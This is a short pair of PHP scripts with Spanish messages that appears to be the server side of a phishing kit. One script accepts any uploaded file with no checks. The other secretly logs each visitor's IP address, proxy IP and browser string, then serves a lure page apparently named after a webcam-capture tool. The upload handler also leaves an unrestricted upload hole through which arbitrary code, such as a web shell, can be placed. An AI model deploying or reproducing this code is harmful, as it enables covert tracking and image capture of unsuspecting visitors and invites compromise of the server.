<?php
$target_path = "null/";
$target_path = $target_path . basename( $_FILES['uploadedfile']['name']); 
if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
    echo "El archivo ".  basename( $_FILES['uploadedfile']['name']). 
    " ha sido subido";
} else{
    echo "Ha ocurrido un error, trate de nuevo!";
}
?>
<?php
$Fichero = "ip.txt";
$ip = $_SERVER["REMOTE_ADDR"];
$fecha = date("Y-m-d;H:i:s");
$sistema = $_SERVER['HTTP_USER_AGENT'];
$conproxy = $_SERVER["HTTP_X_FORWARDED_FOR"];
$log = "FECHA: $fecha SISTEMA: $sistema IP: $ip IPPROXY: $conproxy \x0D\x0A";
$fp = fopen($Fichero, "a" );
fwrite($fp, $log);
fclose($fp);
include 'index2.html';
include 'ft/saycheese.html';
?>
